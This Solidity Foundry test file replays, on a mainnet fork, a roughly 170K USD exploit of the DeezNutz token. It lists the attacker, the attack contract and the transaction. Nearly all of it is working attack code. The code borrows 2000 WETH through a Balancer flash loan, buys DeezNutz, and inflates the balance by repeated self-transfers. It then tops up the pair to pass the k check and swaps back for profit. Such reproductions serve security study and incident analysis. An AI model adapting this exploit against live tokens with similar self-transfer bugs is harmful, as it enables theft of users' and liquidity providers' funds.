// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
// @KeyInfo - Total Lost : ~170K USD$
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Vulnerable Contract : https://etherscan.io/address/0xb57e874082417b66877429481473cf9fcd8e0b8a#code
// Attack Tx : https://etherscan.io/tx/0xbeefd8faba2aa82704afe821fd41b670319203dd9090f7af8affdf6bcfec2d61

// @Analysis
// https://twitter.com/ImmuneBytes/status/1664239580210495489



contract DeezNutzTest is Test {
    
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DeezNutz = IERC20(0xb57E874082417b66877429481473CF9FCd8e0b8a); // 404 token can be regarded as erc20
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address pair = 0x1fB4904b26DE8C043959201A63b4b23C414251E2; // pair address

    function setUp() public {
        vm.createSelectFork("mainnet",19277802);
        emit log_named_uint("Before attack, WETH amount", WETH.balanceOf(address(this)) / 1 ether);
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint[] memory amounts = new uint[](1);
        amounts[0] =2000 ether;        

        emit log_string("------------------- flashloan from balancer ---------");
        vault.flashLoan(address(this),tokens, amounts, "");
        emit log_string("------------------- flashloan finish ----------------");
        
        emit log_named_uint("after attack, WETH amount", WETH.balanceOf(address(this)) / 1 ether);

    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        emit log_named_uint("after borrow, WETH amount", WETH.balanceOf(address(this)) / 1 ether);

        WETH.approve(address(router),type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DeezNutz);

        router.swapExactTokensForTokens(WETH.balanceOf(address(this)),0,path,address(this),type(uint).max);
        emit log_named_uint("after swap, DeezNutz amount", DeezNutz.balanceOf(address(this)) / 1 ether);

        for (uint x = 0; x < 5; x++) {
            DeezNutz.transfer(address(this),DeezNutz.balanceOf(address(this)));
            emit log_named_uint("after self transfer, DeezNutz amount", DeezNutz.balanceOf(address(this)) / 1 ether);
        }

        DeezNutz.approve(address(router),type(uint).max);
        path[0] = address(DeezNutz);
        path[1] = address(WETH);

        DeezNutz.transfer(pair,DeezNutz.balanceOf(address(this))/20); // to pass k value test.
        router.swapExactTokensForTokens(DeezNutz.balanceOf(address(this)),0,path,address(this),type(uint).max);
        emit log_named_uint("after swap back, WETH amount", WETH.balanceOf(address(this)) / 1 ether);

        WETH.transfer(msg.sender,2001 ether);
    }

}